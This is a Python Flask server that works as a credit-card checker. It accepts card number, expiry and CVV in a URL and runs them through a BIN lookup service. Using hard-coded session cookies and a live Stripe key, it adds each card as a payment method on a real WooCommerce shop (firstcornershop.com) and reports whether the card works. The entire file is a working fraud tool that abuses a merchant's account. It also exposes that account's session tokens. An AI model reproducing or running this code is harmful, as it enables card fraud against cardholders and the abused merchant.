from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

def validate_credit_card(card_data):
    """
    Validate credit card data format
    Expected format: card_no|mm|yy|cvv
    """
    if not card_data:
        return False, "No card data provided"
    
    parts = card_data.split('|')
    if len(parts) != 4:
        return False, "Invalid format. Use: card_no|mm|yy|cvv"
    
    card_no, mm, yy, cvv = parts
    
    # Validate card number (basic check)
    if not re.match(r'^\d{13,19}$', card_no):
        return False, "Invalid card number"
    
    # Validate month
    if not re.match(r'^\d{1,2}$', mm) or not (1 <= int(mm) <= 12):
        return False, "Invalid month (01-12)"
    
    # Validate year (accept both yy and yyyy)
    if not re.match(r'^\d{2,4}$', yy):
        return False, "Invalid year"
    
    # Convert year to 2-digit format if needed
    if len(yy) == 4:
        yy = yy[2:]
    
    # Validate CVV
    if not re.match(r'^\d{3,4}$', cvv):
        return False, "Invalid CVV"
    
    return True, {
        'card_no': card_no,
        'mm': mm.zfill(2),  # Ensure 2-digit month
        'yy': yy,
        'cvv': cvv,
        'bin': card_no[:6]  # Extract first 6 digits as BIN
    }

def extract_nonce_from_response(response):
    """Extract nonce from response text"""
    text = response.text
    
    # Multiple patterns to try
    patterns = [
        r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
        r"'createAndConfirmSetupIntentNonce'\s*:\s*'([^']+)'",
        r"createAndConfirmSetupIntentNonce\s*=\s*'([^']+)'",
        r"createAndConfirmSetupIntentNonce\s*=\s*\"([^\"]+)\"",
        r"nonce\s*:\s*'([^']+)'.*?createAndConfirmSetupIntent",
        r"var\s+createAndConfirmSetupIntentNonce\s*=\s*['\"]([^'\"]+)['\"]"
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text, re.DOTALL)
        if match:
            return match.group(1)
    
    return None

def get_bin_info(bin_num):
    """Get BIN information from antipublic API"""
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_num}', timeout=5)
        if response.status_code == 200:
            return response.json()
        else:
            return {"error": f"BIN API error: {response.status_code}"}
    except Exception as e:
        return {"error": f"BIN API failed: {str(e)}"}

@app.route('/gateway=stripeauth/cc=<path:card_data>', methods=['GET'])
def process_payment(card_data):
    """
    Process Stripe payment for firstcornershop.com
    Format: /gateway=stripeauth/cc=card_no|mm|yy|cvv
    """
    try:
        # Validate card data
        is_valid, validation_result = validate_credit_card(card_data)
        
        if not is_valid:
            return jsonify({
                'status': 'decline',
                'message': validation_result,
                'card_info': {
                    'bin': validation_result.get('bin', 'unknown'),
                    'last4': 'xxxx'
                }
            }), 200
        
        cc_data = validation_result
        
        # Get BIN information
        bin_info = get_bin_info(cc_data['bin'])
        
        # Step 1: Get initial page to extract nonce
        cookies = {
            '_ga': 'GA1.1.544649996.1763891182',
            '_fbp': 'fb.1.1763891182124.100191493903906824',
            'tk_or': '%22%22',
            'tk_lr': '%22%22',
            'tk_ai': 'EUEUi28hACsZwUsmIiACj1YP',
            'woodmart_cookies_1': 'accepted',
            '__stripe_mid': '5bbf1f4c-f90a-4ad8-bfb9-cf63867d37ec4d4287',
            'wordpress_logged_in_78c0d90855d1393844941d778c1edd5b': 'bohah4202635p%7C1767791298%7CyIx2R3BEHm2vFizjSdRFkWS3EM6ziIfeytKd7qlrHLh%7Cacbd718d5a5fd074aed4f77cd5b466f6e52395d296f73426414f52da6766fc6d',
            '_ga_RZ2HXYG5NY': 'GS2.1.s1766581540$o2$g1$t1766581704$j48$l0$h0',
            'wp-wpml_current_language': 'en',
            'sbjs_migrations': '1418474375998%3D1',
            '__stripe_sid': 'd648f9d6-0540-4c67-aaf8-1c24a975b87a5aad39',
            'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffirstcornershop.com%2Fmy-account%2Fpayment-methods%2F',
        }

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US',
            'referer': 'https://firstcornershop.com/my-account/payment-methods/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }

        response = requests.get('https://firstcornershop.com/my-account/add-payment-method/', 
                              cookies=cookies, 
                              headers=headers, timeout=10)
        
        nonce = extract_nonce_from_response(response)
        
        if not nonce:
            return jsonify({
                'status': 'decline',
                'message': 'Nonce not found',
                'card_info': {
                    'bin': cc_data['bin'],
                    'last4': cc_data['card_no'][-4:],
                    'brand': bin_info.get('brand', 'unknown'),
                    'type': bin_info.get('type', 'unknown'),
                    'country': bin_info.get('country_name', 'unknown')
                }
            }), 200

        # Step 2: Create payment method with Stripe
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }

        stripe_data = f'type=card&card[number]={cc_data["card_no"]}&card[cvc]={cc_data["cvv"]}&card[exp_year]={cc_data["yy"]}&card[exp_month]={cc_data["mm"]}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F35d1c775d8%3B+stripe-js-v3%2F35d1c775d8%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ffirstcornershop.com&time_on_page=19074&client_attribution_metadata[client_session_id]=1d2d53bf-645a-4058-ab49-7f57b2c223c2&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=03f1f51b-0b67-44eb-a8ad-25635de22638&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=96cf39f6-3cee-4008-ba82-c50e9f1d144060102f&muid=5bbf1f4c-f90a-4ad8-bfb9-cf63867d37ec4d4287&sid=d648f9d6-0540-4c67-aaf8-1c24a975b87a5aad39&key=pk_live_51KnIwCBqVauev2abKoSjNWm78cR1kpbtEdrt8H322BjXRXUvjZK2R8iAQEfHPEV9XNOCLmYVADzYkLd96PccE9HN00s4zyYumQ&_stripe_version=2024-06-20'

        response = requests.post('https://api.stripe.com/v1/payment_methods', 
                               headers=stripe_headers, 
                               data=stripe_data, timeout=10)
        
        if response.status_code != 200:
            stripe_error = ""
            try:
                error_json = response.json()
                stripe_error = error_json.get('error', {}).get('code', 'unknown')
                stripe_message = error_json.get('error', {}).get('message', 'unknown')
            except:
                stripe_error = "unknown"
                stripe_message = "unknown"
            
            return jsonify({
                'status': 'decline',
                'message': f'Stripe API error: {response.status_code}',
                'error_code': stripe_error,
                'error_message': stripe_message,
                'card_info': {
                    'bin': cc_data['bin'],
                    'last4': cc_data['card_no'][-4:],
                    'brand': bin_info.get('brand', 'unknown'),
                    'type': bin_info.get('type', 'unknown'),
                    'country': bin_info.get('country_name', 'unknown'),
                    'bank': bin_info.get('bank', 'unknown'),
                    'level': bin_info.get('level', 'unknown')
                }
            }), 200
        
        op = response.json()
        
        if 'id' not in op:
            return jsonify({
                'status': 'decline',
                'message': 'Payment method creation failed',
                'card_info': {
                    'bin': cc_data['bin'],
                    'last4': cc_data['card_no'][-4:],
                    'brand': bin_info.get('brand', 'unknown'),
                    'type': bin_info.get('type', 'unknown'),
                    'country': bin_info.get('country_name', 'unknown')
                }
            }), 200
            
        payment_method_id = op["id"]

        # Step 3: Process payment with the created payment method
        site_cookies = {
            '__stripe_mid': '5bbf1f4c-f90a-4ad8-bfb9-cf63867d37ec4d4287',
            'wordpress_logged_in_78c0d90855d1393844941d778c1edd5b': 'bohah4202635p%7C1767791298%7CyIx2R3BEHm2vFizjSdRFkWS3EM6ziIfeytKd7qlrHLh%7Cacbd718d5a5fd074aed4f77cd5b466f6e52395d296f73426414f52da6766fc6d',
            '__stripe_sid': 'd648f9d6-0540-4c67-aaf8-1c24a975b87a5aad39',
        }

        site_headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://firstcornershop.com',
            'referer': 'https://firstcornershop.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        }

        site_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        
        response = requests.post(
            'https://firstcornershop.com/', 
            params=params,
            cookies=site_cookies, 
            headers=site_headers, 
            data=site_data,
            timeout=10
        )

        # Check if the response indicates success
        try:
            response_json = response.json()
            if response_json.get('success') == True:
                return jsonify({
                    'status': 'success',
                    'message': 'Payment method added successfully',
                    'payment_method_id': payment_method_id,
                    'card_info': {
                        'bin': cc_data['bin'],
                        'last4': cc_data['card_no'][-4:],
                        'brand': bin_info.get('brand', 'unknown'),
                        'type': bin_info.get('type', 'unknown'),
                        'country': bin_info.get('country_name', 'unknown'),
                        'bank': bin_info.get('bank', 'unknown'),
                        'level': bin_info.get('level', 'unknown')
                    }
                }), 200
            else:
                error_msg = response_json.get('data', {}).get('message', 'unknown error')
                return jsonify({
                    'status': 'decline',
                    'message': error_msg,
                    'card_info': {
                        'bin': cc_data['bin'],
                        'last4': cc_data['card_no'][-4:],
                        'brand': bin_info.get('brand', 'unknown'),
                        'type': bin_info.get('type', 'unknown'),
                        'country': bin_info.get('country_name', 'unknown')
                    }
                }), 200
        except Exception as e:
            return jsonify({
                'status': 'decline',
                'message': f'Invalid response from site: {str(e)}',
                'card_info': {
                    'bin': cc_data['bin'],
                    'last4': cc_data['card_no'][-4:],
                    'brand': bin_info.get('brand', 'unknown'),
                    'type': bin_info.get('type', 'unknown'),
                    'country': bin_info.get('country_name', 'unknown')
                }
            }), 200

    except requests.exceptions.Timeout:
        return jsonify({
            'status': 'decline',
            'message': 'Request timeout',
            'card_info': {
                'bin': validation_result.get('bin', 'unknown'),
                'last4': 'xxxx'
            }
        }), 200
    except Exception as e:
        return jsonify({
            'status': 'decline',
            'message': f'Internal error: {str(e)}',
            'card_info': {
                'bin': validation_result.get('bin', 'unknown') if 'validation_result' in locals() else 'unknown',
                'last4': cc_data['card_no'][-4:] if 'cc_data' in locals() else 'xxxx'
            }
        }), 200

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({'status': 'healthy'}), 200

@app.route('/', methods=['GET'])
def home():
    """Home endpoint with usage instructions"""
    return jsonify({
        'message': 'Stripe Payment Processor API',
        'usage': 'GET /gateway=stripeauth/cc=card_no|mm|yy|cvv',
        'example': '/gateway=stripeauth/cc=4258810718241923|01|27|469',
        'features': [
            'Processes cards for firstcornershop.com',
            'Returns BIN information',
            'Detailed error messages',
            'Card brand, type, country info'
        ]
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)